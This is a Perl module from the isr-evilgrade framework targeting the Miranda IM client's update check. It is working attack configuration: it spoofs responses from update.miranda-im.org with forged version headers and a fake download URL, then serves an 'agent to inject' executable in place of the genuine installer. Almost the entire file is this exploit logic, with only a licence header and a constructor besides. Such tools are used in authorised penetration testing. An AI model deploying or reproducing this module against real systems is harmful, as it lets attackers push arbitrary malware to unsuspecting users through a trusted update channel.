###############
# miranda.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::miranda;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'        => 'Miranda',
    'version'     => '1.0',
    'appver'      => '',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com >'],
    'description' => qq{},
    'vh'          => '(update.miranda-im.org)',
    'request'     => [
        {   'req'    => '/update.php',    #regex friendly
            'type'   => 'string',         #file|string|agent|install
            'method' => '',               #any
            'bin'    => 0,
            'string' => '',
            'parse'  => 1,
            'file'   => '',
            'cheader' =>
                "text/html\r\nX-Miranda-Update: true\r\nX-Miranda-Version: 0.7.15\r\nX-Miranda-Version-Complete: 0.7.15.0\r\nX-Miranda-Notes-URL: http://update.miranda-im.org/2009/03/23/miranda-im-v0714-released/\r\nX-Miranda-Download-URL: http://update.miranda-im.org/miranda/miranda-im-v0.7.15-ansi.exe\r\n",
        },

        {   'req'    => '.exe',           #regex friendly
            'type'   => 'agent',          #file|string|agent|install
            'method' => '',               #any
            'bin'    => 1,
            'string' => '',
            'parse'  => 0,
            'file'   => ''
        },

    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
